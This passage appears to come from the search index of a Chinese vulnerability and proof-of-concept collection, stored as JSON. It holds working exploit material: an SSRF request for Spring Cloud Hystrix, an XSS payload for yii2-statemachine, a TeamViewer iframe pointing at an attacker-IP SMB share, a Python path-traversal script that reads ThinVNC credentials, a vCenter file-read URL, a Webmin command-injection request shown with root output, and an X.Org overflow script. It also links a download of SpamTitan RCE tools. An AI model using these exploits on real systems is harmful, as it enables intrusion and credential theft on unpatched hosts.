\u901a\u8fc7\u8fd9\u79cd\u65b9\u6cd5\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\uff0c\u5165\u4fb5\u670d\u52a1\u5668\u3002\u653b\u51fb\u8005\u53ea\u9700\u8981\u5728WikiContentRCE.xml\u6587\u4ef6\u4e2d\uff0c\u5c06echo pwned > c:/windows/temp/RCE_PoC.txt\u5b57\u7b26\u4e32\u66ff\u6362\u6210\u6240\u9700\u7684\u547d\u4ee4\u5373\u53ef\u3002","title":"POC"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/SpamTitan/SpamTitan%207.07%E5%A4%9A%E4%B8%AARCE%E6%BC%8F%E6%B4%9E/","text":"\u94fe\u63a5\uff1a https://pan.baidu.com/s/1nCUADEBXrn-8vsuOjxFd1Q \u63d0\u53d6\u7801\uff1abyze","title":"SpamTitan 7.07\u591a\u4e2aRCE\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Sprig%20Cloud/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u4fe1\u606f: \u00b6 Spring Cloud Netflix\uff0c2.2.4\u4e4b\u524d\u76842.2.x\u7248\u672c\uff0c2.1.6\u4e4b\u524d\u76842.1.x\u7248\u672c\u4ee5\u53ca\u8f83\u65e7\u7684\u4e0d\u53d7\u652f\u6301\u7684\u7248\u672c\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528Hystrix Dashboard proxy.stream\u7aef\u70b9\u5411\u670d\u52a1\u5668\u6258\u7ba1\u53ef\u8bbf\u95ee\u7684\u4efb\u4f55\u670d\u52a1\u5668\u53d1\u51fa\u8bf7\u6c42\u4eea\u8868\u677f\u3002\u6076\u610f\u7528\u6237\u6216\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u4e0d\u5e94\u516c\u5f00\u516c\u5f00\u7684\u5176\u4ed6\u670d\u52a1\u5668\u3002 \u5f71\u54cd\u8303\u56f4: \u00b6 Spring Cloud Netflix 2.2.0\u81f32.2.3 2.1.0\u81f32.1.5 \u8f83\u65e7\u7684\u4e0d\u53d7\u652f\u6301\u7684\u7248\u672c\u4e5f\u4f1a\u53d7\u5230\u5f71\u54cd \u6f0f\u6d1e\u590d\u73b0: \u00b6 poc\uff1a \u00b6 /proxy.stream?origin=http://www.baidu.com \u200b``` #### \u4fee\u590d\u65b9\u6848: \u5b98\u65b9\u5df2\u7ecf\u8fdb\u884c\u5b89\u5168\u5347\u7ea7\uff0c\u53d7\u5f71\u54cd\u7528\u6237\u8bf7\u5c3d\u5feb\u5347\u7ea7\u5230\u4fee\u590d\u7248\u672c: Spring Cloud Netflix\uff1a 2.2.4 2.1.6 \u8f83\u65e7\u7684\u7248\u672c\u5e94\u5347\u7ea7\u5230\u53d7\u652f\u6301\u7684\u5206\u652f","title":"Spring Cloud Netflix Hystrix Dashboard SSRF"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Sprig%20Cloud/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF%E6%BC%8F%E6%B4%9E/#_1","text":"Spring Cloud Netflix\uff0c2.2.4\u4e4b\u524d\u76842.2.x\u7248\u672c\uff0c2.1.6\u4e4b\u524d\u76842.1.x\u7248\u672c\u4ee5\u53ca\u8f83\u65e7\u7684\u4e0d\u53d7\u652f\u6301\u7684\u7248\u672c\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528Hystrix Dashboard proxy.stream\u7aef\u70b9\u5411\u670d\u52a1\u5668\u6258\u7ba1\u53ef\u8bbf\u95ee\u7684\u4efb\u4f55\u670d\u52a1\u5668\u53d1\u51fa\u8bf7\u6c42\u4eea\u8868\u677f\u3002\u6076\u610f\u7528\u6237\u6216\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u4e0d\u5e94\u516c\u5f00\u516c\u5f00\u7684\u5176\u4ed6\u670d\u52a1\u5668\u3002","title":"\u6f0f\u6d1e\u4fe1\u606f:"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Sprig%20Cloud/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF%E6%BC%8F%E6%B4%9E/#_2","text":"Spring Cloud Netflix 2.2.0\u81f32.2.3 2.1.0\u81f32.1.5 \u8f83\u65e7\u7684\u4e0d\u53d7\u652f\u6301\u7684\u7248\u672c\u4e5f\u4f1a\u53d7\u5230\u5f71\u54cd","title":"\u5f71\u54cd\u8303\u56f4:"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Sprig%20Cloud/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF%E6%BC%8F%E6%B4%9E/#_3","text":"","title":"\u6f0f\u6d1e\u590d\u73b0:"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Sprig%20Cloud/Spring%20Cloud%20Netflix%20Hystrix%20Dashboard%20SSRF%E6%BC%8F%E6%B4%9E/#poc","text":"/proxy.stream?origin=http://www.baidu.com \u200b``` #### \u4fee\u590d\u65b9\u6848: \u5b98\u65b9\u5df2\u7ecf\u8fdb\u884c\u5b89\u5168\u5347\u7ea7\uff0c\u53d7\u5f71\u54cd\u7528\u6237\u8bf7\u5c3d\u5feb\u5347\u7ea7\u5230\u4fee\u590d\u7248\u672c: Spring Cloud Netflix\uff1a 2.2.4 2.1.6 \u8f83\u65e7\u7684\u7248\u672c\u5e94\u5347\u7ea7\u5230\u53d7\u652f\u6301\u7684\u5206\u652f","title":"poc\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Spring%20Statemachine/yii2-statemachine%20v2.x.x%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/","text":"\u6f0f\u6d1e\u7b80\u4ecb \u00b6 \u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 yii2-statemachine v2.x.x\u5b58\u5728XSS\u6f0f\u6d1e 2018-06-12 longer https://github.com/ptheofan/yii2-statemachine-demo https://github.com/ptheofan/yii2-statemachine-demo v2.x.x CVE-2018-12290 \u6f0f\u6d1e\u6982\u8ff0 \u00b6 \u7531\u4e8erole\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u53ef\u4ee5\u63d2\u5165js\u4ee3\u7801\u9020\u6210\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002\u5982\u5c06role\u53c2\u6570\u8d4b\u503c\u4e3a guest'%22()%26%25<acx><ScRiPt%20>prompt(123555)</ScRiPt> \uff0c\u5e76\u8fdb\u884cget\u65b9\u5f0f\u63d0\u4ea4\uff0c\u53ef\u9020\u6210\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002 POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a \u00b6 exp\u4ee3\u7801\u5982\u4e0b\uff1a https://127.0.0.1/?role=guest'%22()%26%25 < acx >< ScRiPt % 20 > prompt ( 123555 )</ ScRiPt > POC\u622a\u56fe\u6548\u679c\u5982\u4e0b\uff1a \u00b6","title":"yii2 statemachine v2.x.x\u5b58\u5728XSS\u6f0f\u6d1e"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Spring%20Statemachine/yii2-statemachine%20v2.x.x%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_1","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 yii2-statemachine v2.x.x\u5b58\u5728XSS\u6f0f\u6d1e 2018-06-12 longer https://github.com/ptheofan/yii2-statemachine-demo https://github.com/ptheofan/yii2-statemachine-demo v2.x.x CVE-2018-12290","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Spring%20Statemachine/yii2-statemachine%20v2.x.x%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#_2","text":"\u7531\u4e8erole\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u683c\uff0c\u5bfc\u81f4\u53ef\u4ee5\u63d2\u5165js\u4ee3\u7801\u9020\u6210\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002\u5982\u5c06role\u53c2\u6570\u8d4b\u503c\u4e3a guest'%22()%26%25<acx><ScRiPt%20>prompt(123555)</ScRiPt> \uff0c\u5e76\u8fdb\u884cget\u65b9\u5f0f\u63d0\u4ea4\uff0c\u53ef\u9020\u6210\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002","title":"\u6f0f\u6d1e\u6982\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Spring%20Statemachine/yii2-statemachine%20v2.x.x%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#poc","text":"exp\u4ee3\u7801\u5982\u4e0b\uff1a https://127.0.0.1/?role=guest'%22()%26%25 < acx >< ScRiPt % 20 > prompt ( 123555 )</ ScRiPt >","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Spring%20Statemachine/yii2-statemachine%20v2.x.x%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/#poc_1","text":"","title":"POC\u622a\u56fe\u6548\u679c\u5982\u4e0b\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/","text":"TeamViewer \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2020-13699) \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 15:53:05 \u5f71\u54cd\u7248\u672c \u00b6 TeamViewer < 8.0.258861 TeamViewer < 9.0.28860 TeamViewer < 10.0.258873 TeamViewer < 11.0.258870 TeamViewer < 12.0.258869 TeamViewer < 13.2.36220 TeamViewer < 14.2.56676 TeamViewer < 15.8.3 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 TeamViewer\u5b58\u5728\u672a\u5f15\u7528\u7684\u641c\u7d22\u8def\u5f84\u6216\u5143\u7d20\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u7531\u4e8e\u5e94\u7528\u7a0b\u5e8f\u6ca1\u6709\u6b63\u786e\u5f15\u7528\u5b83\u7684\u81ea\u5b9a\u4e49URI\u5904\u7406\u7a0b\u5e8f\uff0c\u5f53\u5b89\u88c5\u6709TeamViewer\u7684\u6613\u53d7\u653b\u51fb\u7248\u672c\u7684\u7cfb\u7edf\u8bbf\u95ee\u6076\u610f\u521b\u5efa\u7684\u7f51\u7ad9\u65f6\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7cbe\u5fc3\u5236\u4f5c\u7684URL \uff08iframe src='teamviewer10: --play \\\\attacker-IP\\share\\fake.tvs'\uff09 \u5c06\u6076\u610fiframe\u5d4c\u5165\u7f51\u7ad9\u4e2d\uff0c\u4ece\u800c\u542f\u52a8TeamViewer Windows\u684c\u9762\u5ba2\u6237\u7aef\u5e76\u5f3a\u5236\u5176\u6253\u5f00\u8fdc\u7a0bSMB\u5171\u4eab\u3002 Windows\u5c06\u5728\u6253\u5f00SMB\u5171\u4eab\u65f6\uff0c\u6267\u884cNTLM\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5e76\u4e14\u53ef\u4ee5\u8f6c\u53d1\u8be5\u8bf7\u6c42\uff08\u4f7f\u7528\u5982\u54cd\u5e94\u7a0b\u5e8f\u4e4b\u7c7b\u7684\u5de5\u5177\uff09\u4ee5\u6267\u884c\u4ee3\u7801\uff08\u6216\u6355\u83b7\u8be5\u8bf7\u6c42\u4ee5\u8fdb\u884c\u54c8\u5e0c\u7834\u89e3\uff09 \u4fee\u590d\u5efa\u8bae \u00b6 \u9488\u5bf9\u6b64\u6f0f\u6d1e\u5b98\u65b9\u5df2\u57288.0.258861\u30019.0.258860\u300110.0.258873\u300111.0.258870\u300112.0.258869\u300113.2.36220\u300114.2.56676\u300114.7.48350\u548c15.8.3\u7248\u672c\u4e2d\u4fee\u590d\u3002 \u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u53c2\u8003\u4ee5\u4e0b\u94fe\u63a5\u5b89\u88c5\u8865\u4e01\u66f4\u65b0\uff1a https://www.teamviewer.com/en/download/previous-versions/","title":"TeamViewer \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2020-13699)"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/#teamviewer-cve-2020-13699","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-09-23 15:53:05","title":"TeamViewer \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e(CVE-2020-13699)"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/#_1","text":"TeamViewer < 8.0.258861 TeamViewer < 9.0.28860 TeamViewer < 10.0.258873 TeamViewer < 11.0.258870 TeamViewer < 12.0.258869 TeamViewer < 13.2.36220 TeamViewer < 14.2.56676 TeamViewer < 15.8.3","title":"\u5f71\u54cd\u7248\u672c"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/#_2","text":"TeamViewer\u5b58\u5728\u672a\u5f15\u7528\u7684\u641c\u7d22\u8def\u5f84\u6216\u5143\u7d20\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u7531\u4e8e\u5e94\u7528\u7a0b\u5e8f\u6ca1\u6709\u6b63\u786e\u5f15\u7528\u5b83\u7684\u81ea\u5b9a\u4e49URI\u5904\u7406\u7a0b\u5e8f\uff0c\u5f53\u5b89\u88c5\u6709TeamViewer\u7684\u6613\u53d7\u653b\u51fb\u7248\u672c\u7684\u7cfb\u7edf\u8bbf\u95ee\u6076\u610f\u521b\u5efa\u7684\u7f51\u7ad9\u65f6\uff0c\u53ef\u80fd\u4f1a\u88ab\u5229\u7528\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7cbe\u5fc3\u5236\u4f5c\u7684URL \uff08iframe src='teamviewer10: --play \\\\attacker-IP\\share\\fake.tvs'\uff09 \u5c06\u6076\u610fiframe\u5d4c\u5165\u7f51\u7ad9\u4e2d\uff0c\u4ece\u800c\u542f\u52a8TeamViewer Windows\u684c\u9762\u5ba2\u6237\u7aef\u5e76\u5f3a\u5236\u5176\u6253\u5f00\u8fdc\u7a0bSMB\u5171\u4eab\u3002 Windows\u5c06\u5728\u6253\u5f00SMB\u5171\u4eab\u65f6\uff0c\u6267\u884cNTLM\u8eab\u4efd\u9a8c\u8bc1\uff0c\u5e76\u4e14\u53ef\u4ee5\u8f6c\u53d1\u8be5\u8bf7\u6c42\uff08\u4f7f\u7528\u5982\u54cd\u5e94\u7a0b\u5e8f\u4e4b\u7c7b\u7684\u5de5\u5177\uff09\u4ee5\u6267\u884c\u4ee3\u7801\uff08\u6216\u6355\u83b7\u8be5\u8bf7\u6c42\u4ee5\u8fdb\u884c\u54c8\u5e0c\u7834\u89e3\uff09","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/TeamViewer/TeamViewer%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%28CVE-2020-13699%29/#_3","text":"\u9488\u5bf9\u6b64\u6f0f\u6d1e\u5b98\u65b9\u5df2\u57288.0.258861\u30019.0.258860\u300110.0.258873\u300111.0.258870\u300112.0.258869\u300113.2.36220\u300114.2.56676\u300114.7.48350\u548c15.8.3\u7248\u672c\u4e2d\u4fee\u590d\u3002 \u8bf7\u53d7\u5f71\u54cd\u7684\u7528\u6237\u53c2\u8003\u4ee5\u4e0b\u94fe\u63a5\u5b89\u88c5\u8865\u4e01\u66f4\u65b0\uff1a https://www.teamviewer.com/en/download/previous-versions/","title":"\u4fee\u590d\u5efa\u8bae"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ThinVnc/CVE-2019-17662-ThinVNC%201.0b1%20-%20Authentication%20Bypass/","text":"ThinVNC 1.0b1 - Authentication Bypass \u00b6 \u7b80\u4ecb \u00b6 ThinVNC\u662f\u4e00\u6b3e\u57fa\u4e8eHTML5\u548cAJAX\u7684\u8fdc\u7a0b\u684c\u9762\u5b9e\u73b0 POC \u00b6 # Exploit Title: ThinVNC 1.0b1 - Authentication Bypass # Date: 2019-10-17 # Exploit Author: Nikhith Tumamlapalli # Contributor WarMarX # Vendor Homepage: https://sourceforge.net/projects/thinvnc/ # Software Link: https://sourceforge.net/projects/thinvnc/files/ThinVNC_1.0b1/ThinVNC_1.0b1.zip/download # Version: 1.0b1 # Tested on: Windows All Platforms # CVE : CVE-2019-17662 # Description: # Authentication Bypass via Arbitrary File Read #!/usr/bin/python3 import sys import os import requests def exploit ( host , port ): url = \"http://\" + host + \":\" + port + \"/xyz/../../ThinVnc.ini\" r = requests . get ( url ) body = r . text print ( body . splitlines ()[ 2 ]) print ( body . splitlines ()[ 3 ]) def main (): if ( len ( sys . argv ) != 3 ): print ( \"Usage: \\n {} <host> <port> \\n \" . format ( sys . argv [ 0 ])) print ( \"Example: \\n {} 192.168.0.10 5888\" ) else : port = sys . argv [ 2 ] host = sys . argv [ 1 ] exploit ( host , port ) if __name__ == '__main__' : main ()","title":"CVE 2019 17662 ThinVNC 1.0b1   Authentication Bypass"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ThinVnc/CVE-2019-17662-ThinVNC%201.0b1%20-%20Authentication%20Bypass/#thinvnc-10b1-authentication-bypass","text":"","title":"ThinVNC 1.0b1 - Authentication Bypass"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ThinVnc/CVE-2019-17662-ThinVNC%201.0b1%20-%20Authentication%20Bypass/#_1","text":"ThinVNC\u662f\u4e00\u6b3e\u57fa\u4e8eHTML5\u548cAJAX\u7684\u8fdc\u7a0b\u684c\u9762\u5b9e\u73b0","title":"\u7b80\u4ecb"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/ThinVnc/CVE-2019-17662-ThinVNC%201.0b1%20-%20Authentication%20Bypass/#poc","text":"# Exploit Title: ThinVNC 1.0b1 - Authentication Bypass # Date: 2019-10-17 # Exploit Author: Nikhith Tumamlapalli # Contributor WarMarX # Vendor Homepage: https://sourceforge.net/projects/thinvnc/ # Software Link: https://sourceforge.net/projects/thinvnc/files/ThinVNC_1.0b1/ThinVNC_1.0b1.zip/download # Version: 1.0b1 # Tested on: Windows All Platforms # CVE : CVE-2019-17662 # Description: # Authentication Bypass via Arbitrary File Read #!/usr/bin/python3 import sys import os import requests def exploit ( host , port ): url = \"http://\" + host + \":\" + port + \"/xyz/../../ThinVnc.ini\" r = requests . get ( url ) body = r . text print ( body . splitlines ()[ 2 ]) print ( body . splitlines ()[ 3 ]) def main (): if ( len ( sys . argv ) != 3 ): print ( \"Usage: \\n {} <host> <port> \\n \" . format ( sys . argv [ 0 ])) print ( \"Example: \\n {} 192.168.0.10 5888\" ) else : port = sys . argv [ 2 ] host = sys . argv [ 1 ] exploit ( host , port ) if __name__ == '__main__' : main ()","title":"POC"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/VMware/VMware%20vCenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","text":"VMware vCenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u00b6 \u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-10-14 11:26:15 Poc: http://x.x.x.x/eam/vib?id=c:\\programData\\Vmware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properti \u539f\u6587\u94fe\u63a5\uff1a https://twitter.com/ptswarm/status/1316016337550938122","title":"VMware vCenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/VMware/VMware%20vCenter%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#vmware-vcenter","text":"\u6700\u540e\u66f4\u65b0\u4e8e\uff1a2020-10-14 11:26:15 Poc: http://x.x.x.x/eam/vib?id=c:\\programData\\Vmware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properti \u539f\u6587\u94fe\u63a5\uff1a https://twitter.com/ptswarm/status/1316016337550938122","title":"VMware vCenter\u672a\u6388\u6743\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Webmin/CVE-2019-15107/CVE-2019-15107%20Webmin%201.920%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"CVE-2019-15107 Webmin RCE <=1.920 \u00b6 1. Webmin <=1.920 2. \u6f0f\u6d1e\u9700\u8981\u5f00\u542f\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\u3002 https://10.10.20.166:10000/password_change.cgi poc \u00b6 \u5728\u53c2\u6570 old \u540e\u52a0\u4e0a |ifconfig \u6267\u884c\u547d\u4ee4\u3002\uff08user\u4e0d\u5b58\u5728\u4ecd\u7136\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\uff09 POST /password_change.cgi HTTP/1.1 Host: 10.10.20.166:10000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Cookie: redirect=1; testing=1; sid=x; sessiontest=1 Referer: https://10.10.20.166:10000/session_login.cgi Content-Type: application/x-www-form-urlencoded Content-Length: 60 user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2 <div class=\"panel-body\"> <hr> <center><h3>Failed to change password : The current password is incorrectuid=0(root) gid=0(root) groups=0(root) </h3></center> \u6279\u91cf\u811a\u672cgithub\u83b7\u53d6 \u53c2\u8003\u94fe\u63a5\uff1a \u00b6 https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107","title":"CVE-2019-15107  Webmin RCE <=1.920"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Webmin/CVE-2019-15107/CVE-2019-15107%20Webmin%201.920%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#cve-2019-15107-webmin-rce-1920","text":"1. Webmin <=1.920 2. \u6f0f\u6d1e\u9700\u8981\u5f00\u542f\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd\u3002 https://10.10.20.166:10000/password_change.cgi","title":"CVE-2019-15107  Webmin RCE &lt;=1.920"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Webmin/CVE-2019-15107/CVE-2019-15107%20Webmin%201.920%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"\u5728\u53c2\u6570 old \u540e\u52a0\u4e0a |ifconfig \u6267\u884c\u547d\u4ee4\u3002\uff08user\u4e0d\u5b58\u5728\u4ecd\u7136\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\uff09 POST /password_change.cgi HTTP/1.1 Host: 10.10.20.166:10000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Cookie: redirect=1; testing=1; sid=x; sessiontest=1 Referer: https://10.10.20.166:10000/session_login.cgi Content-Type: application/x-www-form-urlencoded Content-Length: 60 user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2 <div class=\"panel-body\"> <hr> <center><h3>Failed to change password : The current password is incorrectuid=0(root) gid=0(root) groups=0(root) </h3></center> \u6279\u91cf\u811a\u672cgithub\u83b7\u53d6","title":"poc"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/Webmin/CVE-2019-15107/CVE-2019-15107%20Webmin%201.920%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107","title":"\u53c2\u8003\u94fe\u63a5\uff1a"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/X.org%20X%20server/CVE-2019-17624-X.Org%20X%20Server%201.20.4%20-%20Local%20Stack%20Overflow-Linux%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2X%20Server%E6%9C%AC%E5%9C%B0%E6%A0%88%E6%BA%A2%E5%87%BAPOC/","text":"CVE-2019-17624-X.Org X Server 1.20.4 - Local Stack Overflow-Linux\u56fe\u5f62\u754c\u9762X Server\u672c\u5730\u6808\u6ea2\u51faPOC \u00b6 0x1 \u7b80\u5355\u4ecb\u7ecd X Server \u662f\u7edd\u5927\u5bf9\u6570 Linux \u53d1\u884c\u7248\u548cUnix\u7cfb\u7edf\u7684\u57fa\u7840\u56fe\u5f62\u754c\u9762\u7a0b\u5e8f\uff0c\u662f\u7cfb\u7edf\u6807\u914d\u3002\u800c\u6b64\u7a0b\u5e8f\u4e5f\u662f\u4ee5Root\u6743\u9650\u542f\u52a8\u7684\uff0c\u56e0\u800c\u6210\u529f\u6ea2\u51fa\u5b83\u800c\u83b7\u5f97\u7684 shell \uff0c\u4e5f\u662froot\u6743\u9650\u3002 0x2 \u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f # \u65f6\u95f4: 2019-10-16 # \u4f5c\u8005: Marcelo V\u00e1zquez (s4vitar) # \u5382\u5546: https://www.x.org/ # \u7248\u672c: <= 1.20.4 # \u6d4b\u8bd5\u5e73\u53f0: Linux # CVE: CVE-2019-17624 0x3 POC #!/usr/bin/python #coding: utf-8 # ************************************************************************ # * Author: Marcelo V\u00e1zquez (aka s4vitar) * # * X.Org X Server 1.20.4 / X Protocol Version 11 (Stack Overflow) * # ************************************************************************ import sys , time import ctypes as ct from ctypes import cast from ctypes.util import find_library def access_violation ( x11 , current_display ): keyboard = ( ct . c_char * 1000 )() x11 . XQueryKeymap ( current_display , keyboard ) if __name__ == '__main__' : print \" \\n [*] Loading x11... \\n \" time . sleep ( 2 ) x11 = ct . cdll . LoadLibrary ( find_library ( \"X11\" )) current_display = x11 . XOpenDisplay ( None ) print \"[*] Exploiting... \\n \" time . sleep ( 1 ) try : access_violation ( x11 , current_display ) except : print \" \\n Error... \\n \" sys . exit ( 1 )","title":"CVE 2019 17624 X.Org X Server 1.20.4   Local Stack Overflow Linux\u56fe\u5f62\u754c\u9762X Server\u672c\u5730\u6808\u6ea2\u51faPOC"},{"location":"03-%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/X.org%20X%20server/CVE-2019-17624-X.Org%20X%20Server%201.20.4%20-%20Local%20Stack%20Overflow-Linux%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2X%20Server%E6%9C%AC%E5%9C%B0%E6%A0%88%E6%BA%A2%E5%87%BAPOC/#cve-2019-17624-xorg-x-server-1204-local-stack-overflow-linuxx-serverpoc","text":"0x1 \u7b80\u5355\u4ecb\u7ecd X Server \u662f\u7edd\u5927\u5bf9\u6570 Linux 